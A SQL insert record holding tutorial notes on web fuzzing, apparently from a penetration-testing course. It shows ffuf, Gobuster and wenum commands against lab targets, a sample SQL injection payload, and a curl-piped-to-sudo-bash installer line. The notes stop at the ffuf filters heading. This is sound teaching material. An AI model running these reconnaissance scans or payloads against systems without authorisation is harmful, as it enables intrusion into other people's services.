-- Documents Part 4
INSERT INTO "Document" ("id", "title", "slug", "description", "contentMarkdown", "contentHtml", "status", "visibility", "readingTimeMin", "categoryId", "authorId", "createdAt", "updatedAt", "publishedAt", "deletedAt")
VALUES ('cmvfp3gsb00eiida00bwme9l2', 'Web Fuzzing', 'web-fuzzing', '---', '# Web Fuzzing — Complete Notes

---

## Table of Contents

1. [Introduction to Web Fuzzing](#1-introduction-to-web-fuzzing)
   - 1.1 [What Web Fuzzing Is](#11-what-web-fuzzing-is)
   - 1.2 [Fuzzing vs. Brute-forcing](#12-fuzzing-vs-brute-forcing)
   - 1.3 [Why Fuzz Web Applications](#13-why-fuzz-web-applications)
   - 1.4 [Essential Concepts](#14-essential-concepts)
2. [Tooling](#2-tooling)
   - 2.1 [Installing Go, Python, and PIPX](#21-installing-go-python-and-pipx)
   - 2.2 [FFUF](#22-ffuf)
   - 2.3 [Gobuster](#23-gobuster)
   - 2.4 [FeroxBuster](#24-feroxbuster)
   - 2.5 [wfuzz / wenum](#25-wfuzz--wenum)
3. [Directory and File Fuzzing](#3-directory-and-file-fuzzing)
   - 3.1 [Uncovering Hidden Assets](#31-uncovering-hidden-assets)
   - 3.2 [Wordlists and SecLists](#32-wordlists-and-seclists)
   - 3.3 [How ffuf Works](#33-how-ffuf-works)
   - 3.4 [Directory Fuzzing](#34-directory-fuzzing)
   - 3.5 [File Fuzzing](#35-file-fuzzing)
4. [Recursive Fuzzing](#4-recursive-fuzzing)
   - 4.1 [How Recursive Fuzzing Works](#41-how-recursive-fuzzing-works)
   - 4.2 [Why Use Recursive Fuzzing](#42-why-use-recursive-fuzzing)
   - 4.3 [Recursive Fuzzing with ffuf](#43-recursive-fuzzing-with-ffuf)
   - 4.4 [Being Responsible (Rate / Depth / Timeout)](#44-being-responsible-rate--depth--timeout)
5. [Parameter and Value Fuzzing](#5-parameter-and-value-fuzzing)
   - 5.1 [GET vs POST Parameters](#51-get-vs-post-parameters)
   - 5.2 [Why Parameters Matter](#52-why-parameters-matter)
   - 5.3 [Fuzzing GET Parameter Values with wenum](#53-fuzzing-get-parameter-values-with-wenum)
   - 5.4 [Fuzzing POST Parameter Values with ffuf](#54-fuzzing-post-parameter-values-with-ffuf)
6. [Virtual Host and Subdomain Fuzzing](#6-virtual-host-and-subdomain-fuzzing)
   - 6.1 [VHosts vs Subdomains](#61-vhosts-vs-subdomains)
   - 6.2 [Gobuster VHost Fuzzing](#62-gobuster-vhost-fuzzing)
   - 6.3 [Gobuster Subdomain (DNS) Fuzzing](#63-gobuster-subdomain-dns-fuzzing)
7. [Filtering Fuzzing Output](#7-filtering-fuzzing-output)
   - 7.1 [Why Filtering Matters](#71-why-filtering-matters)
   - 7.2 [Gobuster Filters](#72-gobuster-filters)
   - 7.3 [FFUF Filters](#73-ffuf-filters)
   - 7.4 [wenum Filters](#74-wenum-filters)
   - 7.5 [Feroxbuster Filters](#75-feroxbuster-filters)
   - 7.6 [Demonstration: Default vs No Filter](#76-demonstration-default-vs-no-filter)
8. [Validating Findings](#8-validating-findings)
   - 8.1 [Why Validate](#81-why-validate)
   - 8.2 [Manual Verification](#82-manual-verification)
   - 8.3 [Using curl for Validation](#83-using-curl-for-validation)
9. [Web APIs](#9-web-apis)
   - 9.1 [What a Web API Is](#91-what-a-web-api-is)
   - 9.2 [REST, SOAP, and GraphQL](#92-rest-soap-and-graphql)
   - 9.3 [API vs Web Server](#93-api-vs-web-server)
10. [Identifying Endpoints](#10-identifying-endpoints)
    - 10.1 [REST Endpoints and Parameters](#101-rest-endpoints-and-parameters)
    - 10.2 [SOAP Endpoints and Parameters](#102-soap-endpoints-and-parameters)
    - 10.3 [GraphQL Endpoints, Queries, and Mutations](#103-graphql-endpoints-queries-and-mutations)
11. [API Fuzzing](#11-api-fuzzing)
    - 11.1 [What API Fuzzing Is](#111-what-api-fuzzing-is)
    - 11.2 [Why Fuzz APIs](#112-why-fuzz-apis)
    - 11.3 [Types of API Fuzzing](#113-types-of-api-fuzzing)
    - 11.4 [Exploring and Fuzzing the API](#114-exploring-and-fuzzing-the-api)

---

# 1. Introduction to Web Fuzzing

---

## 1.1 What Web Fuzzing Is

Web fuzzing is a core technique in web application security used to find vulnerabilities by throwing many different inputs at an application and watching how it reacts. Instead of testing one thing by hand, fuzzing **automates** the process of sending unexpected, malformed, or random data to the target. The idea is to see which inputs cause strange behavior, errors, or crashes, because those reactions often point to hidden flaws an attacker could exploit. Fuzzing is especially powerful for uncovering things that manual testing would miss, since it can try thousands of inputs quickly. It is one of the first techniques you reach for when mapping out an unfamiliar web application.

---

## 1.2 Fuzzing vs. Brute-forcing

People often use the words "fuzzing" and "brute-forcing" interchangeably, and for beginners that is fine, but there is a subtle difference worth knowing. **Fuzzing casts a wide net** — it feeds the application all sorts of unexpected inputs (malformed data, invalid characters, odd combinations) to see how it handles the unknown. **Brute-forcing is more targeted** — it systematically tries many values for one specific thing, like guessing a password or an ID from a dictionary. Think of a locked door: fuzzing is throwing every object you can find at it to see what happens, while brute-forcing is methodically trying every key on a keyring until one opens it.

- **Fuzzing** → wide, exploratory, uses wordlists of patterns, mutations, or random sequences.
- **Brute-forcing** → narrow, systematic, uses predefined dictionaries to guess a specific value.

---

## 1.3 Why Fuzz Web Applications

Web applications handle huge amounts of sensitive data, which makes them prime targets, and their complexity means manual testing alone cannot cover everything. Fuzzing fills that gap in several important ways. It **uncovers hidden vulnerabilities** by triggering unexpected behavior, **automates** the tedious work of generating and sending test inputs, and **simulates real attacks** so you find weaknesses before criminals do. It also **strengthens input validation** (helping catch SQLi and XSS weaknesses), **improves code quality** by surfacing bugs, and supports **continuous security** when built into CI/CD pipelines. In short, fuzzing is an indispensable part of any security professional''s toolkit.

Key benefits at a glance:

- Uncovering hidden vulnerabilities that normal testing misses.
- Automating security testing to save time and effort.
- Simulating real-world attacks proactively.
- Strengthening input validation against SQLi and XSS.
- Improving overall code quality.
- Enabling continuous security in the development lifecycle.

---

## 1.4 Essential Concepts

Before fuzzing in practice, you need to know the core vocabulary, because every tool and write-up uses these terms constantly. A **wordlist** is the dictionary of guesses you feed the fuzzer; a **payload** is the actual data sent; **response analysis** is how you read the server''s replies to spot anomalies. You also need to understand **false positives** (harmless results flagged as bugs) and **false negatives** (real bugs the fuzzer missed), because validating results is a huge part of the job. Finally, **fuzzing scope** is the specific part of the app you are targeting.

| Concept | Description | Example |
|---------|-------------|---------|
| Wordlist | A list of words, filenames, directory names, or parameter values used as input. | `admin`, `login`, `backup`, `config` |
| Payload | The actual data sent to the app during fuzzing. | `'' OR 1=1 --` (SQL injection) |
| Response Analysis | Examining responses (codes, errors) to spot anomalies. | `200 OK` vs `500` with a DB error |
| Fuzzer | The tool that automates sending payloads and analyzing responses. | `ffuf`, `wfuzz`, Burp Intruder |
| False Positive | A result wrongly flagged as a vulnerability. | A `404` for a non-existent directory. |
| False Negative | A real vulnerability the fuzzer fails to detect. | A subtle payment logic flaw. |
| Fuzzing Scope | The specific parts of the app you are targeting. | Only the login page or one API endpoint. |

---

### Documentation Example (CTF-style write-up)

> **Methodology note:** Fuzzing plan for target `http://IP:PORT`.
>
> - **Scope:** web root directories, then files inside discovered dirs, then parameters.
> - **Tool:** `ffuf` v2.1.0, wordlist from SecLists.
> - **Validation policy:** every `200`/`301` hit confirmed manually with `curl` before reporting (to rule out false positives).
>
> **Screenshot placeholder:** `[ Attach plan / scope note here ]`

---

# 2. Tooling

---

## 2.1 Installing Go, Python, and PIPX

Most modern fuzzing tools are written in **Go** or **Python**, so you need both runtimes installed before anything else. **pipx** is a helper that installs Python command-line apps into isolated virtual environments, so their dependencies never clash with each other or with your system. This keeps your machine clean and lets you run many Python tools side by side without conflicts. On a Debian-based system (like Ubuntu or Kali), you can install everything with the `apt` package manager. Always update your package lists first so you get the newest versions.

**Step 1 — Update package lists:**

```bash
$ sudo apt update
```

**Step 2 — Install Go:**

```bash
$ sudo apt install -y golang
```

**Step 3 — Install Python and pip:**

```bash
$ sudo apt install -y python3 python3-pip
```

**Step 4 — Install and configure pipx:**

```bash
$ sudo apt install pipx
$ pipx ensurepath
$ sudo pipx ensurepath --global
```

**Step 5 — Verify the installs** by checking versions:

```bash
$ go version
$ python3 --version
```

If both print version numbers, the installs succeeded.

---

## 2.2 FFUF

**FFUF (Fuzz Faster U Fool)** is a fast web fuzzer written in Go, and it is the workhorse of this module. It excels at quickly enumerating directories, files, and parameters within web applications. Its combination of speed, flexibility, and ease of use makes it a favorite among security professionals. You tell ffuf where to insert each wordlist entry using the special `FUZZ` keyword in the URL, and it rapidly swaps in every word while analyzing the responses. It is the tool you will use most often throughout fuzzing work.

**Install ffuf:**

```bash
$ go install github.com/ffuf/ffuf/v2@latest
```

**Main use cases:**

| Use Case | Description |
|----------|-------------|
| Directory and File Enumeration | Quickly find hidden directories and files on a web server. |
| Parameter Discovery | Find and test parameters within web applications. |
| Brute-Force Attack | Discover login credentials or other sensitive values. |

---

## 2.3 Gobuster

**Gobuster** is another popular fuzzer known for its speed and simplicity, which makes it great for beginners and experts alike. While ffuf is highly flexible, Gobuster shines at a few focused jobs done fast. It is particularly strong at **content discovery** (directories and files), **DNS subdomain enumeration**, and **virtual host discovery**. Because its commands are straightforward, it is often the quickest way to run a standard directory or subdomain scan.

**Install Gobuster:**

```bash
$ go install github.com/OJ/gobuster/v3@latest
```

**Main use cases:**

| Use Case | Description |
|----------|-------------|
| Content Discovery | Find hidden directories, files, and virtual hosts. |
| DNS Subdomain Enumeration | Identify subdomains of a target domain. |
| WordPress Content Detection | Use specific wordlists to find WordPress content. |

---

## 2.4 FeroxBuster

**FeroxBuster** is a fast, **recursive** content discovery tool written in Rust. It is designed for brute-force discovery of **unlinked** content — files and directories that are not referenced anywhere on the site and so cannot be found by simply crawling. It is described as more of a "forced browsing" tool than a pure fuzzer like ffuf. Thanks to Rust''s performance, it runs very fast and is especially good at digging into nested directory structures automatically.

**Install FeroxBuster:**

```bash
$ curl -sL https://raw.githubusercontent.com/epi052/feroxbuster/main/install-nix.sh | sudo bash -s $HOME/.local/bin
```

**Main use cases:**

| Use Case | Description |
|----------|-------------|
| Recursive Scanning | Discover nested directories and files automatically. |
| Unlinked Content Discovery | Find content not linked anywhere in the app. |
| High-Performance Scans | Use Rust''s speed for fast content discovery. |

---

## 2.5 wfuzz / wenum

**wenum** is an actively maintained fork of the classic **wfuzz**, a highly versatile command-line fuzzer famous for its flexibility and customization. It is especially well-suited to **parameter fuzzing**, letting you test a wide range of input values against an application. If you are on a pentest distro like Kali or PwnBox, `wfuzz` may already be installed. However, installing wfuzz currently has complications, so **wenum** is recommended as a drop-in replacement — the commands and syntax are interchangeable, so you can swap `wenum` and `wfuzz` freely.

**Install wenum** (uses pipx for a clean isolated environment):

```bash
$ pipx install git+https://github.com/WebFuzzForge/wenum
$ pipx runpip wenum install setuptools
```

**Main use cases:**

| Use Case | Description |
|----------|-------------|
| Directory and File Enumeration | Find hidden directories and files. |
| Parameter Discovery | Find and test parameters. |
| Brute-Force Attack | Discover credentials or sensitive values. |

---

### Documentation Example (CTF-style write-up)

> **Environment note:** Tooling installed on attack host.
>
> ```bash
> $ ffuf -V        # v2.1.0-dev
> $ gobuster version
> $ feroxbuster -V
> $ wenum --version
> ```
>
> **Evidence / Notes:** All four fuzzers installed and confirmed working. SecLists present at `/usr/share/seclists/`. Recorded so the engagement is reproducible by teammates.
>
> **Screenshot placeholder:** `[ Attach version output of each tool ]`

---

# 3. Directory and File Fuzzing

---

## 3.1 Uncovering Hidden Assets

Web applications almost always contain resources that are **not linked** anywhere on the visible site — hidden directories, files, and endpoints. These concealed areas are valuable to an attacker because they often hold sensitive data (backups, config files, logs with credentials), outdated and vulnerable scripts, development resources (test environments, admin panels), or undocumented features. Because these areas are hidden, they usually lack the security hardening of public-facing pages, making them easy targets. Directory and file fuzzing is the systematic way to discover them: you probe the server with a list of likely names and watch the responses to find what actually exists.

What you are hunting for:

- **Sensitive data:** backups, config settings, logs with credentials.
- **Outdated content:** old file versions vulnerable to known exploits.
- **Development resources:** test/staging sites, admin panels.
- **Hidden functionalities:** undocumented endpoints that expose bugs.

---

## 3.2 Wordlists and SecLists

Wordlists are the lifeblood of fuzzing — they supply the candidate names your tool will try. A good wordlist dramatically increases your chances of finding hidden assets. These lists are built from scraping common names off the web, analyzing data breaches, and extracting paths from known vulnerabilities, then curated to remove duplicates and junk. Tools like ffuf and wfuzz do **not** ship with built-in wordlists; instead they work with external files, which gives you the freedom to pick or build the right list. The most famous collection is **SecLists**, a huge open-source repository of wordlists for all kinds of security testing.

**Note on location:** On PwnBox the folder is `/usr/share/seclists/` (all lowercase), but other distros may name it `SecLists`. If a command fails, double-check the path.

**Most commonly used web-content wordlists from SecLists:**

- `Discovery/Web-Content/common.txt` — broad general-purpose list; great starting point.
- `Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt` — larger, directory-focused.
- `Discovery/Web-Content/raft-large-directories.txt` — massive directory list for thorough campaigns.
- `Discovery/Web-Content/big.txt` — large list of both directories and files.

---

## 3.3 How ffuf Works

Understanding ffuf''s workflow makes every later command obvious. You give ffuf a **wordlist** and a **URL containing the `FUZZ` keyword**. The `FUZZ` keyword is a placeholder — ffuf replaces it with each entry from the wordlist, one at a time, and sends a request for each. It then analyzes every response (status code, size, etc.) and filters the results so you only see the interesting ones. For example, a URL of `http://localhost/FUZZ` tells ffuf to try `http://localhost/admin`, `http://localhost/backup`, and so on.

The four-step mental model:

1. **Wordlist** — you provide a list of candidate names.
2. **URL with FUZZ** — you mark where entries get inserted.
3. **Requests** — ffuf swaps `FUZZ` for each word and sends a request.
4. **Response Analysis** — ffuf reads and filters the responses.

---

## 3.4 Directory Fuzzing

Directory fuzzing is the first step — it finds hidden folders on the web server. You point ffuf at the web root with `FUZZ` as the directory placeholder, and feed it a directory wordlist. ffuf then tries each name and reports which ones exist based on their response codes. A `301 Moved Permanently` or `200 OK` typically signals a real directory worth investigating. This gives you a map of the server''s folder structure to dig into further.

**Step 1 — Run directory fuzzing:**

```bash
$ ffuf -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -u http://IP:PORT/FUZZ
```

**Flag breakdown:**

- `-w` (wordlist): path to the wordlist to use (here a medium directory list).
- `-u` (URL): the base URL to fuzz; `FUZZ` is the placeholder for each word.

**Example result:**

```
w2ksvrus    [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 0ms]
```

ffuf found a directory called `w2ksvrus`, shown by the `301` status — a potential entry point for further investigation.

---

## 3.5 File Fuzzing

Once you have found directories, file fuzzing digs **inside** them to find specific files. Web apps use many file types, and discovering the wrong-permission or forgotten ones can reveal secrets. You give ffuf a filename wordlist and, crucially, tell it which **extensions** to append using `-e`. This makes ffuf try each word with each extension (e.g. `index.php`, `index.html`, `index.bak`). Finding something like `config.php.bak` could leak database credentials, and old scripts like `test.php` may be exploitable.

**Common extensions to fuzz for:**

- `.php` — server-side PHP code.
- `.html` — web page structure/content.
- `.txt` — plain text, often logs or notes.
- `.bak` — backup files preserving old versions.
- `.js` — JavaScript files adding interactivity.

**Step 1 — Run file fuzzing with extensions:**

```bash
$ ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://IP:PORT/w2ksvrus/FUZZ -e .php,.html,.txt,.bak,.js -v
```

**Flag breakdown:**

- `-w`: filename wordlist (`common.txt`).
- `-u`: target URL with `FUZZ` inside the discovered `w2ksvrus` directory.
- `-e .php,.html,.txt,.bak,.js`: extensions appended to each word.
- `-v`: verbose output, showing the full URL of each hit.

**Example result:**

```
[Status: 200] http://IP:PORT/w2ksvrus/dblclk.html
[Status: 200] http://IP:PORT/w2ksvrus/index.html
```

Two files were discovered inside `/w2ksvrus/`, each worth inspecting further.

---

### Documentation Example (CTF-style write-up)

> **Finding:** Hidden directory and files discovered via fuzzing.
>
> **Reproduction:**
> ```bash
> $ ffuf -w .../DirBuster-2007_directory-list-2.3-medium.txt -u http://10.129.42.190/FUZZ
> # -> w2ksvrus [301]
>
> $ ffuf -w .../common.txt -u http://10.129.42.190/w2ksvrus/FUZZ -e .html,.php,.bak -v
> # -> dblclk.html [200], index.html [200]
> ```
>
> **Evidence / Notes:** Directory `/w2ksvrus/` (301) not linked from the main site. Contains `dblclk.html` and `index.html`. Each manually confirmed with `curl` returning `200 OK`. Flagged for content review (possible sensitive data / old content).
>
> **Screenshot placeholder:** `[ Attach ffuf dir + file results ]`

---

# 4. Recursive Fuzzing

---

## 4.1 How Recursive Fuzzing Works

When a target has many nested directories, fuzzing each level by hand is slow and tedious. **Recursive fuzzing** automates this by diving deeper on its own. It is a simple three-stage process. First, it fuzzes the top-level directory (the web root). Second, whenever it finds a valid directory, it automatically creates a new "branch" and starts fuzzing inside that directory too. Third, it keeps repeating this for every directory it finds, going deeper and deeper until it hits a set depth limit or runs out of new directories. Picture a tree: the web root is the trunk, each found directory is a branch, and the fuzzer explores every branch to its leaves.

**The three stages:**

1. **Initial Fuzzing** — start at the web root `/`, send requests from the wordlist, note `200`/`301` hits.
2. **Directory Discovery and Expansion** — for each found directory (e.g. `admin`), start a fresh fuzz at `http://host/admin/FUZZ`.
3. **Iterative Depth** — repeat for every new directory until a depth limit is reached or nothing new is found.

---

## 4.2 Why Use Recursive Fuzzing

Recursive fuzzing is about working smarter, not harder. On complex applications it saves enormous time because you do not have to manually feed each newly discovered directory back into the tool. It is also more **thorough**, systematically exploring every branch so you are far less likely to miss a hidden asset buried deep in the structure. It reduces manual effort and **scales** well to large applications where hand exploration would be impractical. The trade-off is that it can be resource-intensive, which the next subsection addresses.

Benefits:

- **Efficiency:** automates discovery of nested directories.
- **Thoroughness:** explores every branch, reducing missed assets.
- **Reduced manual effort:** no need to re-run on each new directory.
- **Scalability:** ideal for large applications.

---

## 4.3 Recursive Fuzzing with ffuf

ffuf supports recursion with the `-recursion` flag, which tells it to automatically fuzz any directory it discovers. So if it finds `admin`, it immediately queues a new job for `http://host/admin/FUZZ`. The `-ic` flag is also useful: it tells ffuf to **ignore commented lines** (lines starting with `#`) in the wordlist, so comments are not treated as real inputs. As ffuf runs, you will see `[INFO] Adding a new job to the queue` messages each time it branches into a newly found directory.

**Step 1 — Run recursive fuzzing:**

```bash
$ ffuf -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -ic -v -u http://IP:PORT/FUZZ -e .html -recursion
```

**Flag breakdown:**

- `-w`: the wordlist.
- `-ic`: ignore commented (`#`) lines in the wordlist.
- `-v`: verbose output with full URLs.
- `-u`: target with `FUZZ` placeholder.
- `-e .html`: also try the `.html` extension.
- `-recursion`: automatically fuzz every discovered directory.

**What happens in the example:** ffuf finds `level1` (301), branches into it, then finds `level2` and `level3` inside, queuing each. It discovers `index.html` at each level, and the `index.html` in `level3` is notably larger — it contains the flag `HTB{r3curs1v3_fuzz1ng_w1ns}`.

---

## 4.4 Being Responsible (Rate / Depth / Timeout)

Recursive fuzzing is powerful but can overwhelm a server with too many requests, causing performance problems or triggering security alerts. To stay responsible, ffuf gives you controls to tame the process. `-recursion-depth` caps how deep it goes, `-rate` limits requests per second so you do not flood the server, and `-timeout` stops the fuzzer hanging on unresponsive pages. Using these keeps your testing both effective and considerate of the target.

**Control flags:**

- `-recursion-depth`: maximum recursion depth (e.g. `2` = starting dir + immediate subdirs).
- `-rate`: requests per second cap, preventing server overload.
- `-timeout`: per-request timeout, avoiding hangs on dead targets.

**Step 1 — Run a controlled recursive scan:**

```bash
$ ffuf -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -ic -u http://IP:PORT/FUZZ -e .html -recursion -recursion-depth 2 -rate 500
```

This limits depth to 2 levels and caps the rate at 500 requests per second.

---

### Documentation Example (CTF-style write-up)

> **Finding:** Nested directory structure uncovered via recursive fuzzing.
>
> **Reproduction:**
> ```bash
> $ ffuf -w .../DirBuster-...-medium.txt -ic -u http://10.129.42.190/FUZZ -e .html -recursion -recursion-depth 2 -rate 500
> # level1/ -> level1/level2/ , level1/level3/
> # flag at level1/level3/index.html
> ```
>
> **Evidence / Notes:** Three nested levels discovered automatically. Flag `HTB{r3curs1v3_fuzz1ng_w1ns}` found in the deepest `index.html` (larger size gave it away). Rate limited to 500 req/s and depth to 2 to avoid overloading the target.
>
> **Screenshot placeholder:** `[ Attach recursion queue + flag file ]`

---

# 5. Parameter and Value Fuzzing

---

## 5.1 GET vs POST Parameters

Parameters carry information between the browser and the server, acting like variables that influence how the app behaves. They come in two main forms. **GET parameters** sit right in the URL after a `?`, with multiple ones joined by `&` — they are visible to anyone who sees the URL, so they are used for non-sensitive actions like searching or filtering. **POST parameters** travel hidden inside the request **body**, like a sealed envelope, which makes them the choice for sensitive data like passwords. POST data is encoded as either `application/x-www-form-urlencoded` (key-value pairs) or `multipart/form-data` (used when files are involved).

**GET example** (visible in URL):

```http
https://example.com/search?query=fuzzing&category=security
```

**POST example** (hidden in body):

```http
POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=your_username&password=your_password
```

---

## 5.2 Why Parameters Matter

Parameters are the gateways through which you interact with an application, so manipulating them is a primary way to find vulnerabilities. By changing parameter values you can test how the app handles unexpected input, and the results can be dramatic. Altering a product ID in a shopping URL might expose pricing errors or other users'' orders; modifying a hidden parameter might unlock admin functions; injecting code into a search parameter might reveal **XSS** or **SQL injection**. This is why discovering hidden parameters and fuzzing their values is such a high-value activity.

Examples of what parameter manipulation can reveal:

- Changing a product ID → pricing errors or unauthorized access to other orders.
- Modifying a hidden parameter → hidden features or admin functions.
- Injecting code into a query → XSS or SQL injection.

---

## 5.3 Fuzzing GET Parameter Values with wenum

Here the goal is to find the one secret **value** that makes a known parameter behave differently. First you probe the endpoint manually with curl to learn its behavior — it may complain that a parameter is missing, then complain that your value is invalid, which tells you it is checking values. Guessing values by hand is far too slow, so you automate it with **wenum**, placing the `FUZZ` keyword where the value goes. You hide the noise (like `404`s) with `--hc` and watch for the one response that stands out with a `200`.

**Step 1 — Probe manually with curl to learn behavior:**

```bash
$ curl http://IP:PORT/get.php
Invalid parameter value
x:

$ curl http://IP:PORT/get.php?x=1
Invalid parameter value
x: 1
```

The app checks parameter `x` and rejects invalid values.

**Step 2 — Fuzz the value with wenum:**

```bash
$ wenum -w /usr/share/seclists/Discovery/Web-Content/common.txt --hc 404 -u "http://IP:PORT/get.php?x=FUZZ"
```

**Flag breakdown:**

- `-w`: the wordlist of candidate values.
- `--hc 404`: hide all `404` responses to cut noise.
- `?x=FUZZ`: `FUZZ` is swapped for each wordlist value.

**Step 3 — Spot the standout `200` and confirm it:**

```bash
$ curl http://IP:PORT/get.php?x=OA...
HTB{...}
```

The value `OA...` returned `200 OK` and revealed the flag.

---

## 5.4 Fuzzing POST Parameter Values with ffuf

POST parameter fuzzing is similar but the payload goes in the **body**, not the URL. Again, you start by probing with curl (`-d ""` sends an empty POST body) to see that a parameter like `y` is expected. Then you automate with **ffuf**, using `-X POST` to set the method, `-H` to set the content type, and `-d "y=FUZZ"` to send the fuzzed value in the body. You match only useful responses with `-mc 200` so the correct value stands out immediately.

**Step 1 — Probe the POST parameter with curl:**

```bash
$ curl -d "" http://IP:PORT/post.php
Invalid parameter value
y:
```

The `-d ""` flag sends a POST request with an empty body; the app expects parameter `y`.

**Step 2 — Fuzz the POST value with ffuf:**

```bash
$ ffuf -u http://IP:PORT/post.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "y=FUZZ" -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200 -v
```

**Flag breakdown:**

- `-u`: target URL.
- `-X POST`: use the POST method.
- `-H "Content-Type: ..."`: declare the body encoding.
- `-d "y=FUZZ"`: the body data, with `FUZZ` as the value placeholder.
- `-w`: wordlist of candidate values.
- `-mc 200`: match only `200 OK` responses.
- `-v`: verbose output.

**Step 3 — Confirm the correct value:**

```bash
$ curl -d "y=SU..." http://IP:PORT/post.php
HTB{...}
```

The value `SU...` returned `200` and revealed the flag.

---

### Documentation Example (CTF-style write-up)

> **Finding:** Hidden valid parameter values discovered via value fuzzing.
>
> **Reproduction:**
> ```bash
> # GET parameter x
> $ wenum -w .../common.txt --hc 404 -u "http://10.129.42.190/get.php?x=FUZZ"
> $ curl "http://10.129.42.190/get.php?x=OA..."   # -> HTB{...}
>
> # POST parameter y
> $ ffuf -u http://10.129.42.190/post.php -X POST \
>   -H "Content-Type: application/x-www-form-urlencoded" \
>   -d "y=FUZZ" -w .../common.txt -mc 200
> $ curl -d "y=SU..." http://10.129.42.190/post.php   # -> HTB{...}
> ```
>
> **Evidence / Notes:** Both endpoints validate parameter values server-side; only one value each returns `200`. Values recovered by fuzzing and confirmed manually. In a real app these would be sensitive identifiers rather than flags.
>
> **Screenshot placeholder:** `[ Attach wenum + ffuf standout 200 lines ]`

---

# 6. Virtual Host and Subdomain Fuzzing

---

## 6.1 VHosts vs Subdomains

Both virtual hosts and subdomains help organize web content, but they work differently and are discovered differently. **Virtual hosting (vhosting)** lets one server with one IP serve many websites; the server decides which site to show based on the **Host header** in the request. **Subdomains** (like `blog.example.com`) are extensions of a main domain, and unlike vhosts they resolve to IP addresses through **DNS records**. The key distinction for testing: vhosts are found by manipulating the Host header, while subdomains are found through DNS queries. Both can expose hidden or internal applications.

| Feature | Virtual Hosts | Subdomains |
|---------|---------------|-----------|
| Identification | By the `Host` header in HTTP requests. | By DNS records pointing to IPs. |
| Purpose | Host multiple sites on one server. | Organize sections/services of a site. |
| Security Risks | Misconfigured vhosts expose internal apps/data. | Subdomain takeover if DNS is mismanaged. |

---

## 6.2 Gobuster VHost Fuzzing

Gobuster can discover hidden virtual hosts by trying many hostnames in the Host header and watching which ones respond. First you must map the base domain to the target IP in your `/etc/hosts` file so name-based requests work. Then you run Gobuster in `vhost` mode, giving it the base URL, a wordlist, and the crucial `--append-domain` flag, which attaches the base domain to each wordlist word (turning `admin` into `admin.inlanefreight.htb`). Gobuster sends each as a Host header and flags the valid ones — a `200` status usually means a real, accessible vhost.

**Step 1 — Add the base vhost to `/etc/hosts`:**

```bash
$ echo "IP inlanefreight.htb" | sudo tee -a /etc/hosts
```

**Step 2 — Run Gobuster vhost fuzzing:**

```bash
$ gobuster vhost -u http://inlanefreight.htb:81 -w /usr/share/seclists/Discovery/Web-Content/common.txt --append-domain
```

**Flag breakdown:**

- `vhost`: activates virtual-host fuzzing mode.
- `-u http://inlanefreight.htb:81`: base URL (host `inlanefreight.htb`, port `81`).
- `-w`: wordlist of candidate vhost names.
- `--append-domain`: appends the base domain to each word, forming full hostnames.

**Example result:**

```
Found: admin.inlanefreight.htb:81 Status: 200 [Size: 100]
```

The `200` status on `admin.inlanefreight.htb` marks it as a valid, accessible virtual host.

---

## 6.3 Gobuster Subdomain (DNS) Fuzzing

Gobuster also enumerates subdomains through DNS, which maps the attack surface of a domain. In `dns` mode, Gobuster generates subdomain names from a wordlist, appends them to the target domain, and tries to **resolve** each one via DNS. If a generated subdomain resolves to an IP, it is considered valid and reported. This can reveal forgotten or hidden subdomains that host sensitive services. You supply the target domain with `-d` and a subdomain wordlist with `-w`.

**Step 1 — Run Gobuster subdomain fuzzing:**

```bash
$ gobuster dns -d inlanefreight.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
```

**Flag breakdown:**

- `dns`: activates DNS/subdomain fuzzing mode.
- `-d inlanefreight.com`: the target domain to find subdomains for.
- `-w`: subdomain wordlist (here the top 5000 subdomains).

**Example result:**

```
Found: www.inlanefreight.com
Found: blog.inlanefreight.com
```

Each `Found:` line is a subdomain that successfully resolved.

**Note:** In the latest Gobuster release, `-d` now sets the delay between requests, not the domain. Use `--do` or `--domain` to specify the target domain if you are on the newest version.

---

### Documentation Example (CTF-style write-up)

> **Finding:** Hidden virtual host `admin.inlanefreight.htb` exposes an admin app.
>
> **Reproduction:**
> ```bash
> $ echo "10.129.42.190 inlanefreight.htb" | sudo tee -a /etc/hosts
> $ gobuster vhost -u http://inlanefreight.htb:81 -w .../common.txt --append-domain
> # Found: admin.inlanefreight.htb:81  Status: 200
> $ curl -H "Host: admin.inlanefreight.htb" http://10.129.42.190:81/
> ```
>
> **Evidence / Notes:** `admin.inlanefreight.htb` returns `200` and serves distinct content from the main vhost, confirming a hidden internal application reachable via Host header manipulation. Added to `/etc/hosts` for browser access.
>
> **Screenshot placeholder:** `[ Attach gobuster vhost 200 result + admin page ]`

---

# 7. Filtering Fuzzing Output

---

## 7.1 Why Filtering Matters

Fuzzers send thousands of requests and generate mountains of output, most of which is noise (like endless `404`s). Without filtering, the few meaningful results get buried and are easy to miss. Every major fuzzer therefore offers powerful filtering to **include** only what you want or **exclude** what you do not. You filter on things like status code, response size, word count, line count, response time, and even regex matches on the body. Learning these filters is what turns a flood of output into a short, actionable list. Each tool uses slightly different flag names for the same ideas.

---

## 7.2 Gobuster Filters

Gobuster''s filtering is simpler than the others, and note that the `-s` and `-b` options only work in `dir` fuzzing mode. You use `-s` to **include** only certain status codes, `-b` to **exclude** certain status codes, and `--exclude-length` to drop responses of specific sizes (useful for removing uniform error pages). Combining these lets you zero in on real content quickly.

| Flag | Description | Example |
|------|-------------|---------|
| `-s` (include) | Show only these status codes. | Look for redirects: `-s 301,302,307` |
| `-b` (exclude) | Hide these status codes. | Drop errors: `-b 404` |
| `--exclude-length` | Exclude responses of these sizes (supports ranges). | `--exclude-length 0,404` |

**Example — include 200/301, exclude empty responses:**

```bash
$ gobuster dir -u http://example.com/ -w wordlist.txt -s 200,301 --exclude-length 0
```

---

## 7.3 FFUF Filters

